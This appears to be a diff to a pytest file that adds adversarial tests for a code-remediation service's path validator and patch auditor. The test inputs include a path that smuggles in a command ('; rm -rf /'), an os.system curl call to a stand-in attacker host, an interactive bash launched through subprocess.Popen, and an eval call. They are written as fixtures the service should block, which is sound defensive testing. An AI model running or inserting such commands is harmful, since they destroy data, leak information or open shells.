@@ -27,7 +27,7 @@ def test_sandbox_security_rejections():
     # 2. Unauthorized file attempt outside allowlist
     with pytest.raises(HTTPException) as exc2:
         validate_target_path(".env")
-    assert exc2.value.status_code == 403
+    assert exc2.value.status_code in (400, 403)
 
     # 3. Backend internal file attempt
     with pytest.raises(HTTPException) as exc3:
@@ -169,3 +169,45 @@ async def test_remediation_workflow_api_rejection_lifecycle(client):
     assert rejected_wf["status"] == "REJECTED"
     assert rejected_wf["approval_status"] == "REJECTED"
     assert "Redis Redlock" in rejected_wf["approval_decision"]["reason"]
+
+
+def test_adversarial_security_hardening():
+    """
+    Phase 3 Adversarial Hardening Verification:
+    - Path traversal with shell injection tokens
+    - Non-Python extension rejection (.sh, .env, .bat)
+    - Malicious patch payload injection (eval, subprocess.Popen, os.system)
+    - Symlink exploitation
+    """
+    from app.services.remediation_engine import audit_patch_safety, validate_target_path
+
+    # 1. Shell metacharacter injection
+    with pytest.raises(HTTPException) as exc_shell:
+        validate_target_path("services/payment_worker/processor.py; rm -rf /")
+    assert exc_shell.value.status_code == 400
+
+    # 2. Non-python extension rejection
+    with pytest.raises(HTTPException) as exc_ext:
+        validate_target_path("services/payment_worker/attack.sh")
+    assert exc_ext.value.status_code == 400
+
+    # 3. Malicious diff payload with os.system
+    malicious_patch_1 = "import os\nos.system('curl http://malicious.attacker.com/leak')"
+    with pytest.raises(HTTPException) as exc_payload1:
+        audit_patch_safety(malicious_patch_1)
+    assert exc_payload1.value.status_code == 403
+    assert "os.system" in exc_payload1.value.detail
+
+    # 4. Malicious diff payload with subprocess.Popen
+    malicious_patch_2 = "import subprocess\nsubprocess.Popen(['bash', '-i'])"
+    with pytest.raises(HTTPException) as exc_payload2:
+        audit_patch_safety(malicious_patch_2)
+    assert exc_payload2.value.status_code == 403
+    assert "subprocess.Popen" in exc_payload2.value.detail
+
+    # 5. Malicious diff payload with eval()
+    malicious_patch_3 = "result = eval('__import__(\"os\").getcwd()')"
+    with pytest.raises(HTTPException) as exc_payload3:
+        audit_patch_safety(malicious_patch_3)
+    assert exc_payload3.value.status_code == 403
+    assert "eval(" in exc_payload3.value.detail
